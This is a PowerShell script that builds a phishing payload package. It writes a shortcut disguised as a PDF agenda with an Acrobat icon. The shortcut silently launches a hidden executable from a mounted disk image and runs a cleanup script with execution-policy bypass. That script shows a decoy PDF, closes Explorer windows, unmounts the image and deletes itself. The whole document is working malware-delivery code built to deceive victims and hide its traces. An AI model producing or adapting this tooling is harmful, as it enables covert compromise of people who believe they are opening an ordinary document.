$IsoRoot = "C:\tmp\SHARE_1\DocShare"
$VolumeName = "DocShare"
$LnkPath = Join-Path $IsoRoot "Agenda_15-19_6-2026.pdf.lnk"
$CleanupPath = Join-Path $IsoRoot "Microsoft\DocShare.ps1"

@'
function ExitClean {
    if ($PSCommandPath -and (Test-Path -LiteralPath $PSCommandPath)) {
        Start-Process cmd.exe -ArgumentList "/c timeout /t 2 >nul & del ""$PSCommandPath""" -WindowStyle Hidden
    }
}

Start-Sleep -Seconds 5
$deadline = (Get-Date).AddSeconds(45)
try {
    do {
        $v = Get-Volume -FileSystemLabel 'DocShare' -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $v -or -not $v.DriveLetter) {
            break
        }

        $driveRoot = ('{0}:\' -f $v.DriveLetter)
        $pdfSrc = Join-Path $driveRoot 'Shared Documents\Agenda_15-19_6-2026.pdf'
        $pdfDir = Join-Path $env:PUBLIC 'Downloads'
        $pdfDst = Join-Path $pdfDir 'Agenda_15-19_6-2026.pdf'
        try {
            if (-not (Test-Path -LiteralPath $pdfDir)) {
                New-Item -ItemType Directory -Path $pdfDir -Force | Out-Null
            }
            Copy-Item -LiteralPath $pdfSrc -Destination $pdfDst -Force -ErrorAction Stop
        } catch { }

        try {
            $shell = New-Object -ComObject Shell.Application
            foreach ($window in @($shell.Windows())) {
                try {
                    $path = $window.Document.Folder.Self.Path
                    if ($path -and $path.StartsWith($driveRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
                        $window.Quit()
                    }
                } catch { }
            }
        } catch { }

        Start-Sleep -Milliseconds 500
        try {
            Get-DiskImage -Volume $v -ErrorAction Stop | Dismount-DiskImage -ErrorAction Stop
            if (Test-Path -LiteralPath $pdfDst) {
                Start-Process -FilePath $pdfDst
            }
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    } while ((Get-Date) -lt $deadline)
} finally {
    ExitClean
}
'@ | Set-Content -LiteralPath $CleanupPath -Encoding ASCII

$psCmd = @(
    '$vol=''DocShare'''
    '$d=(Get-CimInstance Win32_LogicalDisk|Where-Object {$_.VolumeName -eq $vol}|Select-Object -First 1).DeviceID'
    'if($d){Start-Process -FilePath ($d+''\Microsoft\sqlwriter.exe'') -WindowStyle Hidden;$cleanup=Join-Path $env:TEMP ''DocShare.ps1'';Copy-Item -LiteralPath ($d+''\Microsoft\DocShare.ps1'') -Destination $cleanup -Force -ErrorAction SilentlyContinue;Start-Process powershell.exe -WindowStyle Hidden -WorkingDirectory $env:TEMP -ArgumentList @(''-nop'',''-w'',''hidden'',''-ep'',''bypass'',''-File'',$cleanup)}'
) -join ';'

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($LnkPath)

$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Command `"$psCmd`""
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "$env:ProgramFiles\Adobe\Acrobat DC\Acrobat\Acrobat.exe,-2"
$Shortcut.Description = "Agenda_15-19_6-2026.pdf"
$Shortcut.Save()

Write-Host "[+] Created: $LnkPath"
Write-Host "[+] Created: $CleanupPath"
